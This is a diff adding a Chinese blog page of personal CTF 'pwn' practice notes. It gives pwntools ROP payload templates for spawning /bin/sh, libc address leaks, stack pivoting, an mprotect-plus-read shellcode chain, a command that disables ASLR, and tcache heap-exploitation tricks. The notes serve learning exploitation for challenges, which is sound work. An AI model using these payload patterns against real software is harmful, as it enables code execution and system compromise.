@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>PWN刷题小结 - Ghostasky&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='PWN' /><meta itemprop="name" content="PWN刷题小结">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2021-08-08T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-08-08T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1328">
+<meta itemprop="keywords" content="PWN," /><meta property="og:title" content="PWN刷题小结" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-08T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-08-08T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="PWN刷题小结"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/" /><link rel="prev" href="http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/" /><link rel="next" href="http://ghostasky.github.io/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "PWN刷题小结",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/ghostasky.github.io\/posts\/pwn%E5%B0%8F%E6%80%BB%E7%BB%93\/"
+    },"genre": "posts","keywords": "PWN","wordcount":  1328 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/pwn%E5%B0%8F%E6%80%BB%E7%BB%93\/","datePublished": "2021-08-08T00:00:00+00:00","dateModified": "2021-08-08T00:00:00+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "作者"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              >文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              >分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              >标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                >文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                >分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                >标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                >关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>PWN刷题小结</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-08-08 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-08-08">2021-08-08</time></span>&nbsp;<span title="1328 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1400 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1杂">1.杂</a>
+      <ul>
+        <li><a href="#syswriteputsprintf">sys,write,puts,printf</a></li>
+        <li><a href="#传参">传参</a></li>
+        <li><a href="#关闭aslr">关闭aslr</a></li>
+        <li><a href="#关于recv地址">关于recv地址</a></li>
+      </ul>
+    </li>
+    <li><a href="#1stack">1.Stack</a>
+      <ul>
+        <li><a href="#1栈迁移">1.栈迁移</a></li>
+        <li><a href="#2mprotect">2.mprotect</a></li>
+      </ul>
+    </li>
+    <li><a href="#3heap">3.Heap</a>
+      <ul>
+        <li><a href="#1tchache">1.Tchache</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>[toc]</p>
+<h2 id="1杂" class="heading-element">
+  <a href="#1%e6%9d%82" class="heading-mark"></a>1.杂</h2><p>Ubuntu 18下偶尔会发生栈无法对齐的情况，多retn几次就好了。</p>
+<p><code>strlen()</code>函数来判断输入的长度，遇到<code>'\x00'</code>时会终止，而<code>gets()</code>函数遇到<code>'\x00'</code>并不会截断</p>
+<h3 id="syswriteputsprintf" class="heading-element">
+  <a href="#syswriteputsprintf" class="heading-mark"></a>sys,write,puts,printf</h3><p>system(&quot;/binsh&quot;)</p>
+<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span></span></span></code></pre></div><p>write:输出，read（为0，输入）</p>
+<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048474</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span></span></span></code></pre></div><p>puts</p>
+<div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;vuln&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span></span></span></code></pre></div><p>printf:</p>
+<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">fmtstr_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">fmt_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span></span></span></code></pre></div><h3 id="传参" class="heading-element">
+  <a href="#%e4%bc%a0%e5%8f%82" class="heading-mark"></a>传参</h3><p>32传参：</p>
+<ul>
+<li>传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</li>
+<li>调用号：<code>sys_read</code> 的调用号 为 3，<code>sys_write</code>的调用号 为 4</li>
+<li>调用方式: 使用 <code>int 80h</code>中断进行系统调用</li>
+</ul>
+<p>64位传参：</p>
+<ul>
+<li>传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 <code>rdi, rsi, rdx, rcx, r8, r9</code>寄存器中，返回值存在rax寄存器</li>
+<li>调用号：<code>sys_read</code> 的调用号 为 0 ，<code>sys_write</code> 的调用号 为 1，</li>
+<li>stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15</li>
+<li>调用方式: 使用 syscall 进行系统调用</li>
+</ul>
+<h3 id="关闭aslr" class="heading-element">
+  <a href="#%e5%85%b3%e9%97%adaslr" class="heading-mark"></a>关闭aslr</h3><p><strong>echo 0 &gt; /proc/sys/kernel/randomize_va_space</strong></p>
+<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">gwt</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cyclic</span> <span class="mi">50</span>
+</span></span><span class="line"><span class="cl"><span class="n">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span>
+</span></span><span class="line"><span class="cl"><span class="n">gwt</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cyclic</span> <span class="o">-</span><span class="n">l</span> <span class="mh">0x61616166</span>
+</span></span><span class="line"><span class="cl"><span class="mi">20</span></span></span></code></pre></div><h3 id="关于recv地址" class="heading-element">
+  <a href="#%e5%85%b3%e4%ba%8erecv%e5%9c%b0%e5%9d%80" class="heading-mark"></a>关于recv地址</h3><pre tabindex="0"><code>如果直接返回地址：%p这种：
+stack_addr = int(io.recvuntil(&#39;\n&#39;,drop=True),16)
+
+如果是这种：
+[DEBUG] Received 0x2c bytes:
+    00000000  42 79 65 62  79 65 7e 0a  a0 8a 14 5c  7e 7f 0a 57  │Byeb│ye~·│···\│~··W│
+    00000010  65 6c 63 6f  6d 65 20 74  6f 20 41 43  54 46 27 73  │elco│me t│o AC│TF&#39;s│
+    00000020  20 62 61 62  79 73 74 61  63 6b 21 0a               │ bab│ysta│ck!·│
+那么
+puts_addr = io.recvuntil(&#39;\x7f&#39;)[-6:]
+puts_addr = puts_addr.ljust(8,&#39;\x00&#39;)
+print hex(u64(puts_addr))</code></pre><h2 id="1stack" class="heading-element">
+  <a href="#1stack" class="heading-mark"></a>1.Stack</h2><h3 id="1栈迁移" class="heading-element">
+  <a href="#1%e6%a0%88%e8%bf%81%e7%a7%bb" class="heading-mark"></a>1.栈迁移</h3><p>payload：</p>
+<div class="highlight" id="id-7"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;aaaa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_add</span><span class="o">+</span><span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_add</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="ow">or</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;aaaa&#39;</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;aaaa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_add</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_add</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span></span></span></code></pre></div><p>​	<img loading="lazy" src="/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/906508_BQAUCW64WPUTJ8N.png" alt="img" srcset="/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/906508_BQAUCW64WPUTJ8N.png?size=small, /posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/906508_BQAUCW64WPUTJ8N.png?size=medium 1.5x, /posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/906508_BQAUCW64WPUTJ8N.png?size=large 2x" data-title="img" style="--width: 1200px;--aspect-ratio: 1200 / 344;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="2mprotect" class="heading-element">
+  <a href="#2mprotect" class="heading-mark"></a>2.mprotect</h3><p>mprotect函数，可以修改内存段的权限</p>
+<pre tabindex="0"><code>int mprotect(void *addr, size_t len, int prot);
+addr 内存启始地址
+len  修改内存的长度
+prot 内存的权限</code></pre><div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">栈溢出到mprotect函数</span><span class="err">（</span><span class="n">call</span><span class="o">==</span><span class="n">push</span><span class="o">+</span><span class="n">jmp</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl"><span class="n">所以ret后要留一个返回地址</span><span class="err">，</span><span class="n">因为ret就相当于jmp到mprotect</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload大致为</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mprotect_add</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">ret_add</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">argu1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">argu2</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span> <span class="p">(</span><span class="n">argu3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">第一个参数是被修改内存的地址</span><span class="err">：</span><span class="mh">0x80ea000</span>
+</span></span><span class="line"><span class="cl"><span class="n">第二个参数是被修改内存的大小</span><span class="err">：</span><span class="n">必须是页的整数倍</span><span class="err">，</span><span class="mh">0x1000</span>
+</span></span><span class="line"><span class="cl"><span class="n">第三参数值权限</span><span class="err">：</span><span class="mh">0x7</span>
+</span></span><span class="line"><span class="cl"><span class="n">然后找个pop来平衡堆栈</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="n">ROPgadget</span> <span class="o">--</span><span class="n">binary</span> <span class="n">get_started_3dsctf_2016</span> <span class="o">--</span><span class="n">only</span> <span class="s1">&#39;pop|ret&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">因为是3个参数</span><span class="err">，</span><span class="n">就找3个pop</span>
+</span></span><span class="line"><span class="cl"><span class="n">现在payload</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="mh">0x38</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop3_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mem_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mem_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span> <span class="p">(</span><span class="n">mem_proc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr2是read函数的地址</span><span class="err">，</span><span class="n">将shellcode写入内存</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="n">read函数原型</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="n">ssize_t</span> <span class="n">read</span><span class="p">(</span><span class="nb">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">count</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">fd</span> <span class="n">设为0时就可以从输入端读取内容</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="n">设为我们想要执行的内存地址</span>    
+</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="n">适当大小</span><span class="err">，</span><span class="n">足够写入shellcode就OK</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x38</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop3_ret</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mem_addr</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mem_size</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mem_proc</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop3_ret</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>     
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mem_addr</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mem_addr</span><span class="p">)</span> </span></span></code></pre></div><h2 id="3heap" class="heading-element">
+  <a href="#3heap" class="heading-mark"></a>3.Heap</h2><h3 id="1tchache" class="heading-element">
+  <a href="#1tchache" class="heading-mark"></a>1.Tchache</h3><p>每条链最多7个，满了后放入fastbin与unsortedbin。</p>
+<p>malloc时优先去tcache中找。</p>
+<p>tcache最大为0x400，大于就会放入unsortedbin。</p>
+<p><strong>一些利用姿势</strong></p>
+<h4 id="tcache-dup" class="heading-element">
+  <a href="#tcache-dup" class="heading-mark"></a>tcache dup</h4><p>double free</p>
+<h4 id="house_of_spirit" class="heading-element">
+  <a href="#house_of_spirit" class="heading-mark"></a>house_of_spirit</h4><p>free掉伪造的chunk，这里不会对size前后的chunk进行检查</p>
+<h4 id="overlapping" class="heading-element">
+  <a href="#overlapping" class="heading-mark"></a>overlapping</h4><p>修改需要被free的size位，（包含其他chunk</p>
+<h4 id="perthread_corruption" class="heading-element">
+  <a href="#perthread_corruption" class="heading-mark"></a>perthread_corruption</h4><p>控制tcache的管理结构。</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2021-08-08 00:00:00">更新于 2021-08-08&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/" data-title="PWN刷题小结" data-hashtags="PWN"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/" data-hashtag="PWN"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/" data-title="PWN刷题小结"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
